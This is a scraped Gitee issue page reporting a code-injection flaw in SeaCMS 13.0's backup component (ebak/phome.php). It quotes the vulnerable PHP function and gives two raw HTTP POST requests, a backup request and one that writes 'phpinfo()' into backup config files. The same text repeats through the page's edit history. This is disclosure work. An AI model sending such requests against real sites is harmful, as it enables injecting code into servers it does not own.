=== Content from gitee.com_9ebcbf32_20250114_181444.html ===


[Sign in](/login)
[Sign up](/signup)

* [Explore](/explore)
* [Enterprise](/enterprises)
* [Education](/education)
* [Search](/search)
* [Help](/help)
* [Terms of use](/terms)
* [About Us](/about_us)

[![Gitee — A Git-based Code Hosting and Research Collaboration Platform](/static/images/logo.svg?t=158106664 "Gitee — A Git-based Code Hosting and Research Collaboration Platform")
![Gitee — A Git-based Code Hosting and Research Collaboration Platform](/static/images/logo-black.svg?t=158106664 "Gitee — A Git-based Code Hosting and Research Collaboration Platform")](https://gitee.com)
[Explore](/explore "Explore")[Enterprise](/enterprises "Enterprise")[Education](/education "Education")[Gitee Premium](https://gitee.cn?utm_source=giteecom "Gitee Premium")[Gitee AI](https://ai.gitee.com/?utm_sources=site_nav "Gitee AI")
[![Gitee — A Git-based Code Hosting and Research Collaboration Platform](/static/images/logo.svg?t=158106664 "Gitee — A Git-based Code Hosting and Research Collaboration Platform")
![Gitee — A Git-based Code Hosting and Research Collaboration Platform](/static/images/logo-black.svg?t=158106664 "Gitee — A Git-based Code Hosting and Research Collaboration Platform")](https://gitee.com)

![功能更新](https://cn-assets.gitee.com/assets/bulb_off-24ee940be20998aace89a3f040cbc704.svg)
![]()

I know
View Details

[Sign in](/login)[Sign up](/signup)

Fetch the repository succeeded.

Donate
Please sign in before you donate.

Cancel
[Sign in](/login)

Scan WeChat QR to Pay

![]()

Cancel
Complete

Prompt
Switch to Alipay.

OK
Cancel

Watch

[Unwatch](/FengFu01/sea/unwatch)[Watching](/FengFu01/sea/watch)[Releases Only](/FengFu01/sea/release_only_watch)[Ignoring](/FengFu01/sea/ignoring_watch)

[1](/FengFu01/sea/watchers "1")
[Star](/login)[0](/FengFu01/sea/stargazers "0")
## [fufufu](/FengFu01 "fufufu")/[sea](/FengFu01/sea "sea")

[Code](/FengFu01/sea)[Issues
1](/FengFu01/sea/issues)[Pull Requests
0](/FengFu01/sea/pulls)[Wiki](/FengFu01/sea/wikis)[Pipelines](/FengFu01/sea/gitee_go)

Service

[![Sonar mini](https://cn-assets.gitee.com/assets/sonar_mini-5e1b54bb9f6c951d97fb778ef623afea.png)](/FengFu01/sea/quality_analyses?platform=sonar_qube)[![Jenkins for gitee](https://cn-assets.gitee.com/assets/jenkins_for_gitee-554ec65c490d0f1f18de632c48acc4e7.png)](https://gitee.com/help/articles/4193)[![Cloudbase](https://cn-assets.gitee.com/assets/cloudbase-1197b95ea3398aff1df7fe17c65a6d42.png?20200925)
Tencent CloudBase](https://gitee.com/help/articles/4318)[![Cloud serverless](https://cn-assets.gitee.com/assets/cloud_serverless-686cf926ced5d6d2f1d6e606d270b81e.png)
Tencent Cloud Serverless](https://gitee.com/help/articles/4330)[![Logo](https://cn-assets.gitee.com/assets/open_sca/logo-9049ced662b2f9936b8001e6f9cc4952.png)
悬镜安全](/FengFu01/sea/open_sca)[![Sae](https://cn-assets.gitee.com/assets/SAE-f3aa9366a1e2b7fff4747402eb8f10c3.png)
Aliyun SAE](https://help.gitee.com/devops/connect/Aliyun-SAE)[![Codeblitz](https://cn-assets.gitee.com/assets/Codeblitz-8824e38875a106e16e29ff57ec977b08.png)
Codeblitz](https://codeblitz.cloud.alipay.com/gitee/FengFu01/sea/tree/)
Don’t show this again

Update failed. Please try again later!

[Issues](/FengFu01/sea/issues)

 /
详情

Remove this flag
#### Content Risk Flag

This task is identified by  as the content contains sensitive information such as code security bugs, privacy leaks, etc., so it is only accessible to contributors of this repository.

## seacms

Backlog

#IB8S1N

[fufufu](/FengFu01)
owner
Opened this issue
2024-12-03 16:37

Seacms
Version: 13.0
Vulnerable Component:
In the backend path \ebak\phome.php
![输入图片说明](https://foruda.gitee.com/images/1733214654043619177/8983a414\_14685008.png "屏幕截图")
this function：Ebak\_RepPathFiletext（）
follow-up function：
function Ebak\_RepPathFiletext($add){
global $bakpath;
$mypath=trim($add['mypath']);
$oldword=Ebak\_ClearAddsData($add['oldword']);
$newword=Ebak\_ClearAddsData($add['newword']);
$dozz=(int)$add['dozz'];
if(empty($oldword)||empty($mypath))
{
printerror("EmptyRepPathFiletext","history.go(-1)");
}
if(strstr($mypath,".."))
{
printerror("NotChangeRepPathFiletext","history.go(-1)");
}
$path=$bakpath."/".$mypath; //bdata/seacms1
if(!file\_exists($path))
{
printerror("PathNotExists","history.go(-1)");
}
$hand=@opendir($path);
while($file=@readdir($hand))
{
$filename=$path."/".$file;
if($file!="."&&$file!=".."&&is\_file($filename))
{
$value=ReadFiletext($filename);
if($dozz)
{
$newvalue=Ebak\_DoRepFiletextZz($oldword,$newword,$value);
}
else
{
if(!stristr($value,$oldword))
{
continue;
}
$newvalue=str\_replace($oldword,$newword,$value);
}
WriteFiletext\_n($filename,$newvalue);
}
}
printerror("RepPathFiletextSuccess","RepFiletext.php");
}
Three parameters are passed here
![输入图片说明](https://foruda.gitee.com/images/1733214668082174999/9a5ac0b2\_14685008.png "屏幕截图")
Will eventually be called
![输入图片说明](https://foruda.gitee.com/images/1733214672307364450/3aa72144\_14685008.png "屏幕截图")
![输入图片说明](https://foruda.gitee.com/images/1733214680896695542/26ee94ef\_14685008.png "屏幕截图")
![输入图片说明](https://foruda.gitee.com/images/1733214692609977827/a3f7c456\_14685008.png "屏幕截图")
The meaning of the words in the picture is：Here, $filename is the $file under the $path, where $path is a variable for bakpath under mypath. Since mypath is controllable, $path is controllable as well. At this point, $hand is also controllable.
Furthermore, since $file is $hand, $file is controllable here as well file($filename)
In the first few lines
![输入图片说明](https://foruda.gitee.com/images/1733214696873068952/04495c3f\_14685008.png "屏幕截图")
The $bakpath is hardcoded here, and there are filters for ../ and ./, so only files under the $bakpath directory can be controlled.
![输入图片说明](https://foruda.gitee.com/images/1733214703783526536/f32a4e9f\_14685008.png "屏幕截图")
This only applies regular expression matching control to $newvalue, and since the target value is controllable, therefore here...
We can control the WriteFiletext\_n function. The data packet is constructed because this overall process involves changing the content of the file generated after a data backup.
![输入图片说明](https://foruda.gitee.com/images/1733214712988141552/290b1a23\_14685008.png "屏幕截图")
Therefore, it is necessary to back up here first. Clicking on the backup will display the name of the database, the name of the backup folder, and the table names chosen for backing up the data.
![输入图片说明](https://foruda.gitee.com/images/1733214720504488341/bccd1209\_14685008.png "屏幕截图")
A folder will be created after the backup.
![输入图片说明](https://foruda.gitee.com/images/1733214736027735409/ec9d6435\_14685008.png "屏幕截图")
The content is
![输入图片说明](https://foruda.gitee.com/images/1733214740329341193/8fc6a522\_14685008.png "屏幕截图")
Content of Config.php
![输入图片说明](https://foruda.gitee.com/images/1733214748185088845/462a273e\_14685008.png "屏幕截图")
At this point, the vulnerability exploitation principle I am submitting is to change the content of this backup data.
Attack example:
Currently, I will first back up the data from a database table.
![输入图片说明](https://foruda.gitee.com/images/1733214784828461480/9d6076a7\_14685008.png "屏幕截图")
POST /z5fskt/ebak/phomebak.php HTTP/1.1
Host: seacms
Content-Length: 250
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://seacms
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://seacms/z5fskt/ebak/ChangeTable.php?mydbname=seacms&keyboard=sea&act=b
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=4qqjagpiagq24ekmdl76fljqac
Connection: close
phome=DoEbak&mydbname=seacms&baktype=0&filesize=1024&bakline=1000&autoauf=1&bakstru=1&dbchar=utf8&bakdatatype=1&mypath=test&insertf=replace&waitbaktime=0&readme=&tablename%5B%5D=sea\_co\_cls&Submit=%E5%BC%80%E5%A7%8B%E5%A4%87%E4%BB%BD
The folder is test, and the backup table is sea\_co\_cls
![输入图片说明](https://foruda.gitee.com/images/1733214794391022310/1f67e4eb\_14685008.png "屏幕截图")
![输入图片说明](https://foruda.gitee.com/images/1733214800268427696/19747808\_14685008.png "屏幕截图")
此时访问phome.php，构造攻击语句
![输入图片说明](https://foruda.gitee.com/images/1733214805643331759/5dd05690\_14685008.png "屏幕截图")
POST /z5fskt/ebak/phome.php?phome=RepPathFiletext HTTP/1.1
Host: seacms
Content-Length: 55
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://seacms
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://seacms/z5fskt/ebak/ReData.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=4qqjagpiagq24ekmdl76fljqac
Connection: close
mypath=test&oldword=sea\_co\_cls&newword=phpinfo()&dozz=1
After simulating the attack, the current config.php is
![输入图片说明](https://foruda.gitee.com/images/1733214817915291716/d7712142\_14685008.png "屏幕截图")
![输入图片说明](https://foruda.gitee.com/images/1733214827215348456/4e642c75\_14685008.png "屏幕截图")
This vulnerability is similar to CVE-2024-40522, but they are different. The attack logic is similar because both involve changing file content, but the files where the vulnerabilities exist are different, as are the functions involved.
Fix Recommendation: Filter the controllable parameters and encrypt the data packets.

Seacms
Version: 13.0
Vulnerable Component:
In the backend path \ebak\phome.php
![输入图片说明](https://foruda.gitee.com/images/1733214654043619177/8983a414\_14685008.png "屏幕截图")
this function：Ebak\_RepPathFiletext（）
follow-up function：
function Ebak\_RepPathFiletext($add){
global $bakpath;
$mypath=trim($add['mypath']);
$oldword=Ebak\_ClearAddsData($add['oldword']);
$newword=Ebak\_ClearAddsData($add['newword']);
$dozz=(int)$add['dozz'];
if(empty($oldword)||empty($mypath))
{
printerror("EmptyRepPathFiletext","history.go(-1)");
}
if(strstr($mypath,".."))
{
printerror("NotChangeRepPathFiletext","history.go(-1)");
}
$path=$bakpath."/".$mypath; //bdata/seacms1
if(!file\_exists($path))
{
printerror("PathNotExists","history.go(-1)");
}
$hand=@opendir($path);
while($file=@readdir($hand))
{
$filename=$path."/".$file;
if($file!="."&&$file!=".."&&is\_file($filename))
{
$value=ReadFiletext($filename);
if($dozz)
{
$newvalue=Ebak\_DoRepFiletextZz($oldword,$newword,$value);
}
else
{
if(!stristr($value,$oldword))
{
continue;
}
$newvalue=str\_replace($oldword,$newword,$value);
}
WriteFiletext\_n($filename,$newvalue);
}
}
printerror("RepPathFiletextSuccess","RepFiletext.php");
}
Three parameters are passed here
![输入图片说明](https://foruda.gitee.com/images/1733214668082174999/9a5ac0b2\_14685008.png "屏幕截图")
Will eventually be called
![输入图片说明](https://foruda.gitee.com/images/1733214672307364450/3aa72144\_14685008.png "屏幕截图")
![输入图片说明](https://foruda.gitee.com/images/1733214680896695542/26ee94ef\_14685008.png "屏幕截图")
![输入图片说明](https://foruda.gitee.com/images/1733214692609977827/a3f7c456\_14685008.png "屏幕截图")
The meaning of the words in the picture is：Here, $filename is the $file under the $path, where $path is a variable for bakpath under mypath. Since mypath is controllable, $path is controllable as well. At this point, $hand is also controllable.
Furthermore, since $file is $hand, $file is controllable here as well file($filename)
In the first few lines
![输入图片说明](https://foruda.gitee.com/images/1733214696873068952/04495c3f\_14685008.png "屏幕截图")
The $bakpath is hardcoded here, and there are filters for ../ and ./, so only files under the $bakpath directory can be controlled.
![输入图片说明](https://foruda.gitee.com/images/1733214703783526536/f32a4e9f\_14685008.png "屏幕截图")
This only applies regular expression matching control to $newvalue, and since the target value is controllable, therefore here...
We can control the WriteFiletext\_n function. The data packet is constructed because this overall process involves changing the content of the file generated after a data backup.
![输入图片说明](https://foruda.gitee.com/images/1733214712988141552/290b1a23\_14685008.png "屏幕截图")
Therefore, it is necessary to back up here first. Clicking on the backup will display the name of the database, the name of the backup folder, and the table names chosen for backing up the data.
![输入图片说明](https://foruda.gitee.com/images/1733214720504488341/bccd1209\_14685008.png "屏幕截图")
A folder will be created after the backup.
![输入图片说明](https://foruda.gitee.com/images/1733214736027735409/ec9d6435\_14685008.png "屏幕截图")
The content is
![输入图片说明](https://foruda.gitee.com/images/1733214740329341193/8fc6a522\_14685008.png "屏幕截图")
Content of Config.php
![输入图片说明](https://foruda.gitee.com/images/1733214748185088845/462a273e\_14685008.png "屏幕截图")
At this point, the vulnerability exploitation principle I am submitting is to change the content of this backup data.
Attack example:
Currently, I will first back up the data from a database table.
![输入图片说明](https://foruda.gitee.com/images/1733214784828461480/9d6076a7\_14685008.png "屏幕截图")
POST /z5fskt/ebak/phomebak.php HTTP/1.1
Host: seacms
Content-Length: 250
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://seacms
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://seacms/z5fskt/ebak/ChangeTable.php?mydbname=seacms&keyboard=sea&act=b
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=4qqjagpiagq24ekmdl76fljqac
Connection: close
phome=DoEbak&mydbname=seacms&baktype=0&filesize=1024&bakline=1000&autoauf=1&bakstru=1&dbchar=utf8&bakdatatype=1&mypath=test&insertf=replace&waitbaktime=0&readme=&tablename%5B%5D=sea\_co\_cls&Submit=%E5%BC%80%E5%A7%8B%E5%A4%87%E4%BB%BD
The folder is test, and the backup table is sea\_co\_cls
![输入图片说明](https://foruda.gitee.com/images/1733214794391022310/1f67e4eb\_14685008.png "屏幕截图")
![输入图片说明](https://foruda.gitee.com/images/1733214800268427696/19747808\_14685008.png "屏幕截图")
此时访问phome.php，构造攻击语句
![输入图片说明](https://foruda.gitee.com/images/1733214805643331759/5dd05690\_14685008.png "屏幕截图")
POST /z5fskt/ebak/phome.php?phome=RepPathFiletext HTTP/1.1
Host: seacms
Content-Length: 55
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://seacms
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://seacms/z5fskt/ebak/ReData.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=4qqjagpiagq24ekmdl76fljqac
Connection: close
mypath=test&oldword=sea\_co\_cls&newword=phpinfo()&dozz=1
After simulating the attack, the current config.php is
![输入图片说明](https://foruda.gitee.com/images/1733214817915291716/d7712142\_14685008.png "屏幕截图")
![输入图片说明](https://foruda.gitee.com/images/1733214827215348456/4e642c75\_14685008.png "屏幕截图")
This vulnerability is similar to CVE-2024-40522, but they are different. The attack logic is similar because both involve changing file content, but the files where the vulnerabilities exist are different, as are the functions involved.
Fix Recommendation: Filter the controllable parameters and encrypt the data packets.

### Comments (0)

[![]()](/FengFu01 "FengFu01")
[fufufu](/FengFu01 "FengFu01") created**任务**

[![]()](/FengFu01 "FengFu01")
[fufufu](/FengFu01 "FengFu01") changed **description**

Original content
Seacms

版本：13.0

漏洞组件：

在后台的后台路径\ebak\phome.php

![输入图片说明](https://foruda.gitee.com/images/1733214654043619177/8983a414\_14685008.png "屏幕截图")

此函数：Ebak\_RepPathFiletext（）

跟进函数：

function Ebak\_RepPathFiletext($add){

 global $bakpath;

 $mypath=trim($add['mypath']);

$oldword=Ebak\_ClearAddsData($add['oldword']);

$newword=Ebak\_ClearAddsData($add['newword']);

$dozz=(int)$add['dozz'];

if(empty($oldword)||empty($mypath))

{

 printerror("EmptyRepPathFiletext","history.go(-1)");

}

if(strstr($mypath,".."))

{

 printerror("NotChangeRepPathFiletext","history.go(-1)");

}

$path=$bakpath."/".$mypath; //bdata/seacms1

if(!file\_exists($path))

{

 printerror("PathNotExists","history.go(-1)");

}

$hand=@opendir($path);

while($file=@readdir($hand))

{

 $filename=$path."/".$file;

 if($file!="."&&$file!=".."&&is\_file($filename))

{

$value=ReadFiletext($filename);

 if($dozz)

{

$newvalue=Ebak\_DoRepFiletextZz($oldword,$newword,$value);

}

else

{

 if(!stristr($value,$oldword))

 {

 continue;

}

$newvalue=str\_replace($oldword,$newword,$value);

}

WriteFiletext\_n($filename,$newvalue);

}

}

printerror("RepPathFiletextSuccess","RepFiletext.php");

}

这里传入三个参数

![输入图片说明](https://foruda.gitee.com/images/1733214668082174999/9a5ac0b2\_14685008.png "屏幕截图")

最终会调用

![输入图片说明](https://foruda.gitee.com/images/1733214672307364450/3aa72144\_14685008.png "屏幕截图")

![输入图片说明](https://foruda.gitee.com/images/1733214680896695542/26ee94ef\_14685008.png "屏幕截图")

![输入图片说明](https://foruda.gitee.com/images/1733214692609977827/a3f7c456\_14685008.png "屏幕截图")

在首几行

![输入图片说明](https://foruda.gitee.com/images/1733214696873068952/04495c3f\_14685008.png "屏幕截图")

这里$bakpath写死，后面有对../和./的过滤,所以只能控制$bakpath路径下的文件

![输入图片说明](https://foruda.gitee.com/images/1733214703783526536/f32a4e9f\_14685008.png "屏幕截图")

这里只是单单对$newvalue进行正则匹配控制，目的值可控，因此这里的

WriteFiletext\_n函数我们就可控了

数据包构造,由于这个大概流程是更改数据备份后，生成的文件的内容

![输入图片说明](https://foruda.gitee.com/images/1733214712988141552/290b1a23\_14685008.png "屏幕截图")

因此需要在这里先进行备份

点击这里的备份，会显示数据库的名称和备份的文件夹名称和备份数据所选择的表名

![输入图片说明](https://foruda.gitee.com/images/1733214720504488341/bccd1209\_14685008.png "屏幕截图")

备份后会生成一个文件夹

![输入图片说明](https://foruda.gitee.com/images/1733214736027735409/ec9d6435\_14685008.png "屏幕截图")

内容是

![输入图片说明](https://foruda.gitee.com/images/1733214740329341193/8fc6a522\_14685008.png "屏幕截图")

Config.php内容

![输入图片说明](https://foruda.gitee.com/images/1733214748185088845/462a273e\_14685008.png "屏幕截图")

而此时我所提交的漏洞攻击原理是更改此备份数据的内容，

攻击举例

目前我先备份一个数据表的数据

![输入图片说明](https://foruda.gitee.com/images/1733214784828461480/9d6076a7\_14685008.png "屏幕截图")

POST /z5fskt/ebak/phomebak.php HTTP/1.1

Host: seacms

Content-Length: 250

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Origin: http://seacms

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://seacms/z5fskt/ebak/ChangeTable.php?mydbname=seacms&keyboard=sea&act=b

Accept-Encoding: gzip, deflate, br

Accept-Language: zh-CN,zh;q=0.9

Cookie: PHPSESSID=4qqjagpiagq24ekmdl76fljqac

Connection: close

phome=DoEbak&mydbname=seacms&baktype=0&filesize=1024&bakline=1000&autoauf=1&bakstru=1&dbchar=utf8&bakdatatype=1&mypath=test&insertf=replace&waitbaktime=0&readme=&tablename%5B%5D=sea\_co\_cls&Submit=%E5%BC%80%E5%A7%8B%E5%A4%87%E4%BB%BD

文件夹为test，备份表为sea\_co\_cls

![输入图片说明](https://foruda.gitee.com/images/1733214794391022310/1f67e4eb\_14685008.png "屏幕截图")

![输入图片说明](https://foruda.gitee.com/images/1733214800268427696/19747808\_14685008.png "屏幕截图")

此时访问phome.php，构造攻击语句

![输入图片说明](https://foruda.gitee.com/images/1733214805643331759/5dd05690\_14685008.png "屏幕截图")

POST /z5fskt/ebak/phome.php?phome=RepPathFiletext HTTP/1.1

Host: seacms

Content-Length: 55

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Origin: http://seacms

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://seacms/z5fskt/ebak/ReData.php

Accept-Encoding: gzip, deflate, br

Accept-Language: zh-CN,zh;q=0.9

Cookie: PHPSESSID=4qqjagpiagq24ekmdl76fljqac

Connection: close

mypath=test&oldword=sea\_co\_cls&newword=phpinfo()&dozz=1

模拟攻击后

此时的config.php

![输入图片说明](https://foruda.gitee.com/images/1733214817915291716/d7712142\_14685008.png "屏幕截图")

![输入图片说明](https://foruda.gitee.com/images/1733214827215348456/4e642c75\_14685008.png "屏幕截图")

此漏洞与CVE-2024-40522很相似，但不同，攻击逻辑相似，因为都是更改文件内容，但漏洞存在的文件是不同的，存在的函数也是不同的

修复建议：对传入可控的参数进行过滤

New content
Seacms

Version: 13.0

Vulnerable Component:

In the backend path \ebak\phome.php

![输入图片说明](https://foruda.gitee.com/images/1733214654043619177/8983a414\_14685008.png "屏幕截图")

this function：Ebak\_RepPathFiletext（）

follow-up function：

function Ebak\_RepPathFiletext($add){

global $bakpath;

$mypath=trim($add['mypath']);

$oldword=Ebak\_ClearAddsData($add['oldword']);

$newword=Ebak\_ClearAddsData($add['newword']);

$dozz=(int)$add['dozz'];

if(empty($oldword)||empty($mypath))

{

 printerror("EmptyRepPathFiletext","history.go(-1)");

}

if(strstr($mypath,".."))

{

 printerror("NotChangeRepPathFiletext","history.go(-1)");

}

$path=$bakpath."/".$mypath; //bdata/seacms1

if(!file\_exists($path))

{

 printerror("PathNotExists","history.go(-1)");

}

$hand=@opendir($path);

while($file=@readdir($hand))

{

$filename=$path."/".$file;

if($file!="."&&$file!=".."&&is\_file($filename))

{

$value=ReadFiletext($filename);

if($dozz)

{

 $newvalue=Ebak\_DoRepFiletextZz($oldword,$newword,$value);

}

else

{

if(!stristr($value,$oldword))

{

 continue;

 }

 $newvalue=str\_replace($oldword,$newword,$value);

 }

 WriteFiletext\_n($filename,$newvalue);

 }

 }

 printerror("RepPathFiletextSuccess","RepFiletext.php");

}

Three parameters are passed here

![输入图片说明](https://foruda.gitee.com/images/1733214668082174999/9a5ac0b2\_14685008.png "屏幕截图")

Will eventually be called

![输入图片说明](https://foruda.gitee.com/images/1733214672307364450/3aa72144\_14685008.png "屏幕截图")

![输入图片说明](https://foruda.gitee.com/images/1733214680896695542/26ee94ef\_14685008.png "屏幕截图")

![输入图片说明](https://foruda.gitee.com/images/1733214692609977827/a3f7c456\_14685008.png "屏幕截图")

In the first few lines

![输入图片说明](https://foruda.gitee.com/images/1733214696873068952/04495c3f\_14685008.png "屏幕截图")

The $bakpath is hardcoded here, and there are filters for ../ and ./, so only files under the $bakpath directory can be controlled.

![输入图片说明](https://foruda.gitee.com/images/1733214703783526536/f32a4e9f\_14685008.png "屏幕截图")

This only applies regular expression matching control to $newvalue, and since the target value is controllable, therefore here...

We can control the WriteFiletext\_n function. The data packet is constructed because this overall process involves changing the content of the file generated after a data backup.

![输入图片说明](https://foruda.gitee.com/images/1733214712988141552/290b1a23\_14685008.png "屏幕截图")

Therefore, it is necessary to back up here first. Clicking on the backup will display the name of the database, the name of the backup folder, and the table names chosen for backing up the data.

![输入图片说明](https://foruda.gitee.com/images/1733214720504488341/bccd1209\_14685008.png "屏幕截图")

A folder will be created after the backup.

![输入图片说明](https://foruda.gitee.com/images/1733214736027735409/ec9d6435\_14685008.png "屏幕截图")

The content is

![输入图片说明](https://foruda.gitee.com/images/1733214740329341193/8fc6a522\_14685008.png "屏幕截图")

Content of Config.php

![输入图片说明](https://foruda.gitee.com/images/1733214748185088845/462a273e\_14685008.png "屏幕截图")

At this point, the vulnerability exploitation principle I am submitting is to change the content of this backup data.

Attack example:

Currently, I will first back up the data from a database table.

![输入图片说明](https://foruda.gitee.com/images/1733214784828461480/9d6076a7\_14685008.png "屏幕截图")

POST /z5fskt/ebak/phomebak.php HTTP/1.1

Host: seacms

Content-Length: 250

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Origin: http://seacms

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://seacms/z5fskt/ebak/ChangeTable.php?mydbname=seacms&keyboard=sea&act=b

Accept-Encoding: gzip, deflate, br

Accept-Language: zh-CN,zh;q=0.9

Cookie: PHPSESSID=4qqjagpiagq24ekmdl76fljqac

Connection: close

phome=DoEbak&mydbname=seacms&baktype=0&filesize=1024&bakline=1000&autoauf=1&bakstru=1&dbchar=utf8&bakdatatype=1&mypath=test&insertf=replace&waitbaktime=0&readme=&tablename%5B%5D=sea\_co\_cls&Submit=%E5%BC%80%E5%A7%8B%E5%A4%87%E4%BB%BD

The folder is test, and the backup table is sea\_co\_cls

![输入图片说明](https://foruda.gitee.com/images/1733214794391022310/1f67e4eb\_14685008.png "屏幕截图")

![输入图片说明](https://foruda.gitee.com/images/1733214800268427696/19747808\_14685008.png "屏幕截图")

此时访问phome.php，构造攻击语句

![输入图片说明](https://foruda.gitee.com/images/1733214805643331759/5dd05690\_14685008.png "屏幕截图")

POST /z5fskt/ebak/phome.php?phome=RepPathFiletext HTTP/1.1

Host: seacms

Content-Length: 55

Cache-Control: max-age=0

Upgrade-Insecure-Requests: 1

Origin: http://seacms

Content-Type: application/x-www-form-urlencoded

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7

Referer: http://seacms/z5fskt/ebak/ReData.php

Accept-Encoding: gzip, deflate, br

Accept-Language: zh-CN,zh;q=0.9

Cookie: PHPSESSID=4qqjagpiagq24ekmdl76fljqac

Connection: close

mypath=test&oldword=sea\_co\_cls&newword=phpinfo()&dozz=1

模拟攻击后

此时的config.php

![输入图片说明](https://foruda.gitee.com/images/1733214817915291716/d7712142\_14685008.png "屏幕截图")

![输入图片说明](https://foruda.gitee.com/images/1733214827215348456/4e642c75\_14685008.png "屏幕截图")

此漏洞与CVE-2024-40522很相似，但不同，攻击逻辑相似，因为都是更改文件内容，但漏洞存在的文件是不同的，存在的函数也是不同的

修复建议：对传入可控的参数进行过滤

[![]()](/FengFu01 "FengFu01")
[fufufu](/FengFu01 "FengFu01") changed **description**

Original content
Seacms

Version: 13.0

Vulnerable Component:

In the backend path \ebak\phome.php

![输入图片说明](https://foruda.gitee.com/images/1733214654043619177/8983a414\_14685008.png "屏幕截图")

this function：Ebak\_RepPathFiletext（）

follow-up function：

function Ebak\_RepPathFiletext($add){

global $bakpath;

$mypath=trim($add['mypath']);

$oldword=Ebak\_ClearAddsData($add['oldword']);

$newword=Ebak\_ClearAddsData($add['newword']);

$dozz=(int)$add['dozz'];

if(empty($oldword)||empty($mypath))

{

printerror("EmptyRepPathFiletext","history.go(-1)");

}

if(strstr($mypath,".."))

{

printerror("NotChangeRepPathFiletext","history.go(-1)");

}

$path=$bakpath."/".$mypath; //bdata/seacms1

if(!file\_exists($path))

{

printerror("PathNotExists","history.go(-1)");

}

$hand=@opendir($path);

while($file=@readdir($hand))

{

$filename=$path."/".$file;

if($file!="."&&$file!=".."&&is\_file($filename))

{

$value=ReadFiletext($filename);

if($dozz)

{

$newvalue=Ebak\_DoRepFiletextZz($oldword,$newword,$value);

}

else

{

if(!stristr($value,$oldword))

{

continue;

}

$newvalue=str\_replace($oldword,$newword,$value);

}

WriteFiletext\_n($filename,$newvalue);

}

}

printerror("RepPathFiletextSuccess","RepFiletext.php");

}

Three parameters are passed here

![输入图片说明](https://foruda.gitee.com/images/1733214668082174999/9a5ac0b2\_14685008.png "屏幕截图")

Will eventually be called

![输入图片说明](https://foruda.gitee.com/images/1733214672307364450/3aa72144\_14685008.png "屏幕截图")

![输入图片说明](https://foruda.gitee.com/images/1733214680896695542/26ee94ef\_14685008.png "屏幕截图")

![输入图片说明](https://foruda.gitee.com/images/1733214692609977827/a3f7c456\_14685008.png "屏幕截图")

In the first few lines

![输入图片说明](https://foruda.gitee.com/images/1733214696873068952/04495c3f\_14685008.png "屏幕截图")

The $bakpath is hardcoded here, and there are filters for ../ and ./, so only files under the $bakpath directory can be controlled.

![输入图片说明](https://foruda.gitee.com/images/1733214703783526536/f32a4e9f\_14685008.png "屏幕截图")

This only applies regular expression matching control to $newvalue, and since the target value is controllable, therefore here...

We can control the WriteFiletext\_n function. The data packet is constructed because this overall process involves changing the content of the file generated after a data backup.

![输入图片说明](https://foruda.gitee.com/images/1733214712988141552/290b1a23\_14685008.png "屏幕截图")

Therefore, it is necessary to back up here first. Clicking on the backup will display the name of the database, the name of the backup folder, and the table names chosen for backing up the data.

![输入图片说明](https://foruda.gitee.com/images/1733214720504488341/bccd1209\_14685008.png "屏幕截图")

A folder will be created after the backup.

